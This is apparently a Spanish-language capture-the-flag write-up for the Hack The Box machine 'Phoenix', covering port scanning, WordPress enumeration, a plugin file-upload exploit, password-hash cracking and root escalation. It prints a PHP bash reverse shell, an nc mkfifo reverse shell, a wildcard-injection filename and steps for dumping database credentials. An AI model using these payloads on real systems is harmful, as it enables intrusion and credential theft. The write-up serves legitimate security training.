---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | Phoenix            |
| Os                     | Linux              |
| Difficulty             | Hard               |
| Points                 | 40                 |
| IP                     | 10.10.11.149       |

## [](#header-2)Introduccion

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/Phoenix/scan1.png)

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.11.149
```

![nmap 1](/assets/images/Phoenix/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.149 -oG allPorts
```

![nmap 2](/assets/images/Phoenix/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos con:

```s
sudo nmap -sCV -p22,80 10.10.11.149 -oN targeted
```

![nmap 3](/assets/images/Phoenix/nmap3.png)

Al acceder al website, nos dirige a un virtual host `phoenix.htb`, asiq ue lo agregaremos a nuestro /etc/hosts y ahora si podremos visualizar correctamente su contenido. 

```s
whatweb http://phoenix.htb
```

Estamos presentes ante una pagina con wordpress. 

![whatweb](/assets/images/Phoenix/whatweb.png)

Asi que lo siguiente fue usar wpscan para enumerar las vulnerabilidades o pluggins que se puedan explotar.
 
```s
#Para que nos enumere usuarios, pluggins vulnerables, y pase la certificacion ssl:
wpscan -v --disable-tls-checks --url https://phoenix.htb --force --enumerate u,vp
#Para que nos enumere pluggins:
wpscan -v --disable-tls-checks --url https://phoenix.htb --force --enumerate p
```
![wp-users](/assets/images/Phoenix/wp_users.png)

![wp-pluggins](/assets/images/Phoenix/wp_plugins.png)

Navegando e investigando sobre lo que contiene la pagina, no encontre nada, pero hay veces que el escaneo no enumera todos los pluggins de wordpress, como es el caso del **download-from-file**, busque exploits para este pluggin y encontre que es vulnerable a un una arbitraria carga de archivos. Asi que intentaremos hacer algo, un reverse shell con php y la llame pwn.phtml por que el <a href="https://www.exploit-db.com/exploits/50287">exploit </a> solo acepta php4 y phtml, pero le gusto mas esta extension, tambien fueron necesarias unas modificaciones que pongo despues.

```php
<?php system("bash -c 'bash -i  >& /dev/tcp/10.10.11.230/4444  0>&1'"); ?>
```

![modify 1](/assets/images/Phoenix/verify1.png)

![modify 2](/assets/images/Phoenix/verify2.png)

Ahora, para obtener la shell solo mandamos un:

```s
curl "https://phoenix.htb/wp-admin/reverse3.phtml" -k
```

![Shell uploaded](/assets/images/Phoenix/shell_uploaded.png)

![Reverse shell](/assets/images/Phoenix/reverse_access.png)

Ahora solo tendremos que entrar en MySQL para enumerar las contrasenas. Las contrasenas del servicio de MySQL estan en el archivo wp-config.php, que ahora ya tenemos acceso. Y para entrar, usamos el comando:

```sql
mysql -uwordpress -p wordpress

select user_login, user_pass from wp_users;
```

![Reverse shell](/assets/images/Phoenix/password_hashes.png)

Es hora de crackear las contrasenas encontradas.

```s
john --wordlist=/usr/share/wordlists/rockyou.txt hash
#superphoenix
```

Una vez crackeada la contrasena, podemos ingresar a la otra maquina por ssh como editor, leer la flag y empezar la escalada de privilegios.

Ahora haremos un arcrchivo en /backup llamado shell.sh con la siguiente linea

```s
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.29 443 >/tmp/f' > shell.sh
```

Y despues para el wildcard

```s
touch -- '-e sh shell.sh'
```

![Wildcard](/assets/images/Phoenix/wild.png)

Y nos ponemos en escucha por el puerto 443

![root](/assets/images/Phoenix/root.png)

![powned](/assets/images/Phoenix/powned.png)